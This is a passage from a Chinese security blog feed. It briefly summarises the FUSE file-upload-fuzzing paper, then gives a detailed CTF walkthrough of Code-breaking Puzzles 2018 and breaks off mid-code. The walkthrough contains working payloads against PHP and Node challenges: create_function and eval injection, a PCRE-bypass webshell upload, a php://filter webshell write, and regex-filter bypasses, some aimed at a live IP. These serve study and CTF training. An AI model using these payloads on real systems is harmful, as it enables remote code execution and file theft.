    <content type="html"><![CDATA[<p>笔记作者：z3r0yu</p><p>原文作者：Taekjin Lee, Seongil Wi, Suyoung Lee, Sooel Son</p><p>原文标题：FUSE: Finding File Upload Bugs via Penetration Testing</p><p>原文来源：NDSS 2020</p><h4 id="0x00-定义"><a href="#0x00-定义" class="headerlink" title="0x00 定义"></a>0x00 定义</h4><ol><li>UFU 不受约束的文件上传</li><li>UEFU 不受约束的可执行文件上传<h4 id="0x01-针对的两个挑战"><a href="#0x01-针对的两个挑战" class="headerlink" title="0x01 针对的两个挑战"></a>0x01 针对的两个挑战</h4></li><li>绕过内容过滤检查系统的检查；</li><li>上传一个可执行文件（可以是PHP, HTML, XHTML, and JS）<h4 id="0x02-应对挑战的方法"><a href="#0x02-应对挑战的方法" class="headerlink" title="0x02 应对挑战的方法"></a>0x02 应对挑战的方法</h4></li><li><p>13种变异策略+5个基础的变异文件对象–&gt;针对挑战1</p></li><li><p>种子文件的可执行性不会被破坏，也就是保证了是可以执行的 –&gt;针对挑战2</p></li></ol><h4 id="0x03-工具设计的几个阶段"><a href="#0x03-工具设计的几个阶段" class="headerlink" title="0x03 工具设计的几个阶段"></a>0x03 工具设计的几个阶段</h4><ol><li>Chain Coordination: 构造链式变异组合，如果链上的某一个变异方式可以触发漏洞，则后面的内容将不会继续进行。注意到这个链其实就是对制定的变异策略的各种组合。但是如过两个变异策略是互相冲突的，则会将这种组合方式清除掉。</li><li>Mutating and Sending Upload Requests: 这个主要是对整体文件上传的表述。但是可以注意到这里提到了unique identifier，这个很重要，写过PoC的都知道这个可以确保我们漏洞验证的准确有效的。但在这个方法中，这个值主要用在了两个地方：文件名和文件的内容注释</li><li>Upload Validation: 第一步是根据response来验证文件是否上传成功；第二步是UPLOAD VALIDATOR中使用的三种方式来对漏洞的存在做验证。使用的方法还挺有意思。</li><li>Uploading .htaccess: 这个文件是用来特殊考虑的，因为这个文件是可以直接控制PHP解释器的行为的。如果能任意上传这个文件那么对应的目录就可以被我们控制了。<h4 id="0x04-变异的对象-Mutation-objectives"><a href="#0x04-变异的对象-Mutation-objectives" class="headerlink" title="0x04 变异的对象 (Mutation objectives)"></a>0x04 变异的对象 (Mutation objectives)</h4>1) Checking the absence of content-filtering checks<br>2) Eliciting incorrect type inferences based on Content<br>3) Exploiting incomplete whitelists or blacklists based on Extension<br>4) Bypassing keyword filtering logic based on Content<br>5) Bypassing filtering logic based on Content-Type<h4 id="0x05-13种变异策略"><a href="#0x05-13种变异策略" class="headerlink" title="0x05 13种变异策略"></a>0x05 13种变异策略</h4><img src="https://pic.downk.cc/item/5ed86489c2a9a83be5b44e6c.png" alt></li></ol><h4 id="0x06-benchmark"><a href="#0x06-benchmark" class="headerlink" title="0x06 benchmark"></a>0x06 benchmark</h4><p>(1) the evaluation set covered by NAVEX<br>(2) popular CMS applications listed by W3Techs<br>(3) highly rated CMS projects in PHP with more than 500 stars on GitHub that report no errors in their installations.</p><h4 id="0x07-个人看法"><a href="#0x07-个人看法" class="headerlink" title="0x07 个人看法"></a>0x07 个人看法</h4><ol><li>总体的系统设计和变异策略很不错（但是变异策略不完全，这个好办在工程方面补上就行）</li><li>感觉比较好的是作者对很多情况进行了定义，表述很清晰</li><li>这个系统可以集成到框架中来对上传漏洞进行发现，也可以继续优化来加强其漏洞发现能力<h4 id="0x08-附录"><a href="#0x08-附录" class="headerlink" title="0x08 附录"></a>0x08 附录</h4>论文链接：<a href="https://wsp-lab.github.io/papers/lee-fuse-ndss20.pdf" target="_blank" rel="noopener">https://wsp-lab.github.io/papers/lee-fuse-ndss20.pdf</a><br>工具链接：<a href="https://github.com/WSP-LAB/FUSE" target="_blank" rel="noopener">https://github.com/WSP-LAB/FUSE</a></li></ol><p>PS: 这篇短文只对论文关键点做了简述，<a href="https://blog.csdn.net/Sunny_Ducky/article/details/105475537" target="_blank" rel="noopener">翻译版本(较为粗略)</a>和<a href="https://nosec.org/home/detail/4187.html" target="_blank" rel="noopener">其它简述</a>见链接。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;笔记作者：z3r0yu&lt;/p&gt;
&lt;p&gt;原文作者：Taekjin Lee, Seongil Wi, Suyoung Lee, Sooel Son&lt;/p&gt;
&lt;p&gt;原文标题：FUSE: Finding File Upload Bugs via Penetration Testin
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Code-breaking Puzzles 2018 Note</title>
    <link href="http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"/>
    <id>http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/</id>
    <published>2020-06-04T02:44:31.000Z</published>
    <updated>2020-06-04T03:02:44.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>题目知识点概述：</p><ol><li>function PHP函数利用技巧</li><li>pcrewaf PHP正则特性</li><li>phpmagic PHP写文件技巧</li><li>phplimit PHP代码执行限制绕过</li><li>nodechr Javascript字符串特性</li><li>javacon SPEL表达式沙盒绕过</li><li>lumenserial 反序列化在7.2下的利用</li><li>picklecode Python反序列化沙盒绕过</li><li>thejs Javascript的原型污染漏洞</li></ol><p>题目来源：<a href="https://code-breaking.com/" target="_blank" rel="noopener">Website</a> | <a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">Github</a></p><p>PS: 比较早写的笔记，但是一直没时间补完(这笔记好像拖了快一年？？？)，暂时不补充了；特点是详细，感觉新手也能看得懂</p><h2 id="0x01-function"><a href="#0x01-function" class="headerlink" title="0x01 function"></a>0x01 function</h2><p>代码以及题目环境可以从Github上找到，一下不在赘述，只提及知识点，</p><h3 id="1-解决正则问题"><a href="#1-解决正则问题" class="headerlink" title="1.解决正则问题"></a>1.解决正则问题</h3><p><code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code>，<code>$action</code>中要出现数字字母下划线以外的字符。<br>可以直接使用burp对字符进行测试(但这个字符必须还是有用的)</p><p><img src="https://i.loli.net/2020/06/04/aiYyHN4MxwXjGrA.png" alt="4D3EEB6F-D725-4532-A1BD-17720F6F5BA6.png"></p><p>PS:网上有的说在这里测试ASCII字符，其实就是有效字符的意思</p><p>至于为什么是 <code>\</code>：</p><blockquote><p>code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c？<br>其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><p>就是\在php中表示默认的命名空间，比如写一些类的时候会在开头写<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br></pre></td></tr></table></figure></p><h3 id="2-create-function-gt-rce"><a href="#2-create-function-gt-rce" class="headerlink" title="2.create_function-&gt;rce"></a>2.create_function-&gt;rce</h3><p>使用<code>create_function(&#39;&#39;, $_GET[&#39;code&#39;]);</code>达到远程RCE的效果</p><p>具体可以看php的源码 Zend/zend_builtin_functions.c:1858</p><p>可见用户输入的参数是function_args、function_code，他们被拼接成一个完整的PHP函数：</p><p><code>function __lambda_func ( function_args ) { function_code } \0</code></p><p>这个函数代码会先放在zend_eval_stringl里执行，可以理解为eval。执行成功后，再于函数列表中找到<strong>lambda_func函数，将其重命名成lambda_%d，%d代表“这是本进程第几个匿名函数”。最后从函数列表里删除</strong>lambda_func。</p><p>由于代码就是简单的拼接，所以我们可以闭合括号，执行任意代码。比如：</p><ol><li>如果可控在第一个参数，需要闭合圆括号和大括号：create_function(‘){}phpinfo();//‘, ‘’);</li><li>如果可控在第二个参数，需要闭合大括号：create_function(‘’, ‘}phpinfo();//‘);</li></ol><p>PS:</p><ol><li><p>扩展一下，类似的eval也是将其中的字符串与进行拼接<br><code>&quot;&lt;?php &quot;.$code.&quot;?&gt;&quot;</code><br>从而可以传入图?&gt;、&lt;?php闭合前后的标签，让中间的代码块不会被当作php代码执行。</p></li><li><p>补充两个CTF常用的查看文件的函数</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(scandir(&apos;../&apos;));/*</span><br><span class="line"></span><br><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));/*</span><br></pre></td></tr></table></figure><h2 id="0x02-pcrewaf"><a href="#0x02-pcrewaf" class="headerlink" title="0x02 pcrewaf"></a>0x02 pcrewaf</h2><p>关键在于正则匹配的绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先要知道正则的匹配流程和引擎</p><blockquote><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入<br>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></blockquote><p>PHP采用的是NFA的正则引擎，具体的解析见 <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">《PHP利用PCRE回溯次数限制绕过某些安全限制》</a></p><p>利用则是通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p><p>POC<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://51.158.75.42:8088/index.php'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure></p><p>or<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">"&lt;?php print_r(scandir('../../../'));print_r(file_get_contents('../../../flag_php7_2_1s_c0rrect'));/*"</span>+<span class="string">'A'</span>*<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure></p><p>也可以使用<code>readfile</code>函数来读取文件<br>此类型的修复方式是使用强等于的方式来判断匹配的结果<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>PS: 这个题目在最初是存在一个非预期解的，当时的正则如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[\(\`].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种形式是可以使用glob+file_get_contents来获取flag的，具体形式如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chopper=var_dump(glob(&apos;../../../*&apos;));</span><br><span class="line">chopper=var_dump(file_get_contents(&apos;../../../flag_php7_2_1s_c0rrect&apos;));</span><br></pre></td></tr></table></figure></p><p>glob()函数是获取与模式匹配的文件路径，找到文件后直接读取。<br>之后的正则修改为了现在的形式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-phpmagic"><a href="#0x03-phpmagic" class="headerlink" title="0x03 phpmagic"></a>0x03 phpmagic</h2><p>关键在于文件写入的地方<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">    file_put_contents($log_name, $output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="1-SERVER-‘SERVER-NAME’"><a href="#1-SERVER-‘SERVER-NAME’" class="headerlink" title="1.$_SERVER[‘SERVER_NAME’]"></a>1.$_SERVER[‘SERVER_NAME’]</h3><p>(1) 查看官方手册发现$_SERVER[‘SERVER_NAME’]是可以被我们控制的，只要修改数据包中host字段的值就好<br><img src="https://i.loli.net/2020/06/04/itv2VnEGmoTgcdQ.png" alt="87A5F220-D3F9-4BC8-B5D3-2ABA6F3A8077.png"></p><p>(2) <code>$log_name</code>来自<code>$_POST[&#39;log&#39;]</code>因而也可控</p><h3 id="2-解决扩展名过滤问题"><a href="#2-解决扩展名过滤问题" class="headerlink" title="2.解决扩展名过滤问题"></a>2.解决扩展名过滤问题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>使用如下payload可以绕过pathinfo对后缀名的检测，进而将内容正常写入filename.php文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=shell.php/.&amp;content=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="3-解决htmlspecialchars过滤问题"><a href="#3-解决htmlspecialchars过滤问题" class="headerlink" title="3.解决htmlspecialchars过滤问题"></a>3.解决htmlspecialchars过滤问题</h3><p>htmlspecialchars函数会将’&lt;’转为’&lt;’，因而不能够直接写webshell。但是 phithon 曾在一篇文章中提到使用PHP伪协议+base64/rot13编码和解码过程处理掉exit–<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">《谈一谈php://filter的妙用》</a></p><p>PS:</p><ol><li>base64必须是4的整数倍；</li><li>要注意base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有=；</li><li>PHP伪协议base64解码的trick：解码中遇到不符合规范的字符直接跳过。</li></ol><p>PHP具有一个特点：一切传入filename的地方都可以使用php伪协议，比如：file_put_contents和readfile函数。在解析phar的时候曾提到过大量的此类函数。</p><h3 id="4-寻找可控变量构造payload"><a href="#4-寻找可控变量构造payload" class="headerlink" title="4.寻找可控变量构造payload"></a>4.寻找可控变量构造payload</h3><p>可以看到$domain内容可控</p><p><img src="https://i.loli.net/2020/06/04/MBCDKwWd1STzj3g.png" alt="163EC8AD-F408-4BF0-BA9F-0B9F455715CA.png"></p><p>构造可利用的base64字符串，最终的数据包如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: php</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://127.0.0.1:8082/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">domain=PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq&amp;log=://filter/write=convert.base64-decode/resource=shell.php/.</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/04/v4BpzdmSoRl1fLY.png" alt="18E49C67-5050-48F3-BA38-46CF64A84919.png"></p><p><u><strong>此处对shell的构造有坑，晚上填一下</strong></u></p><h2 id="0x04-phplimit"><a href="#0x04-phplimit" class="headerlink" title="0x04 phplimit"></a>0x04 phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目限制：函数可以多层嵌套但是最后一个不能包含参数.</p><h3 id="1-session-id"><a href="#1-session-id" class="headerlink" title="1.session_id"></a>1.session_id</h3><p>session_id用于设置和获取当前的会话id，也就是PHPSESSID的值，采用如下这种方式就可以获取当前的PHPSESSID的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id(session_start())</span><br></pre></td></tr></table></figure></p><p>至于编码问题可以使用hex2bin()函数来解决，hex2bin()并不是将16进制转换为2进制，而是将16进制字符串转换为2进制字符串，示例如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $t=<span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span>;</span><br><span class="line">php &gt; var_dump(hex2bin($t));</span><br><span class="line">string(<span class="number">48</span>) <span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span></span><br><span class="line">php &gt; $tt=<span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span>;</span><br><span class="line">php &gt; var_dump(bin2hex($tt));</span><br><span class="line">string(<span class="number">96</span>) <span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span></span><br></pre></td></tr></table></figure></p><p>最终构造的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8084</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/06/04/qB45j72EhPvSmiR.png" alt="1BEFF8E8-E2FD-46F0-8FFA-1546502AEDD5.png"></p><h3 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars"></a>2.get_defined_vars</h3><p><img src="https://i.loli.net/2020/06/04/QreI4gdL2FV8Yny.png" alt="2D6D5105-7368-4C0D-890A-4784365E502E.png"></p><p>下面看一个示例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $b = <span class="string">"zeroyu"</span>;</span><br><span class="line">php &gt; $arr = get_defined_vars();</span><br><span class="line">php &gt; print_r($arr[<span class="string">"b"</span>]);</span><br><span class="line">zeroyu</span><br></pre></td></tr></table></figure></p><p>因为不能传入参数所以我们可以结合current()和next()函数来完成对变量的取值，最终构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;zeroyu=print_r(scandir(&apos;../&apos;));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p><p>此外还可以使用reset来将数组指针定位到第一个位置进而获取我们想要的变量，从而构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?test=readfile(&quot;../flag_phpbyp4ss&quot;);//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure></p><p>之前提到过牌glob函数，所以payload还可以这样写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p><h3 id="3-getcwd"><a href="#3-getcwd" class="headerlink" title="3. getcwd"></a>3. getcwd</h3><p>getcwd()函数是获取当前目录，所以通过切换目录读文件的方案也是可行的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p><p>PS:附加几个小栗子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure></p><h3 id="4-getallheaders"><a href="#4-getallheaders" class="headerlink" title="4.getallheaders"></a>4.getallheaders</h3><p>getallheaders()可以获取全部HTTP请求头信息，从而伪造HTTP头字段就可以达到RCE效果，但是这个函数是apache_request_headers函数的别名，只适用于apache环境对于本题目是没有作用的。</p><p>关于这个函数的使用，可以参考RCTF 2018的r-cursive题目。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: phpinfo(); //</span><br></pre></td></tr></table></figure></p><p>PS:那道题目中还涉及到利用open_basedir进行沙盒逃逸</p><h3 id="5-getenv"><a href="#5-getenv" class="headerlink" title="5.getenv"></a>5.getenv</h3><p>这个函数再PHP5.6版本下不能使用，但是在PHP7.1以及以上版本是可以在不加参数的情况下像get_defined_vars()一样获取服务段的env数据。</p><h2 id="0x05-nodechr"><a href="#0x05-nodechr" class="headerlink" title="0x05 nodechr"></a>0x05 nodechr</h2><p>此题目考察一些javascript的小特性：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从源码上看是很明显拼接直接注入，但是select和union被过滤。</p><h3 id="1-toUpperCase-和toLowerCase-特性"><a href="#1-toUpperCase-和toLowerCase-特性" class="headerlink" title="1.toUpperCase()和toLowerCase()特性"></a>1.toUpperCase()和toLowerCase()特性</h3><p>因而利用JS的小特性进行绕过，具体参考<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">《Fuzz中的javascript大小写特性》</a></p><p>Fuzz代码如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 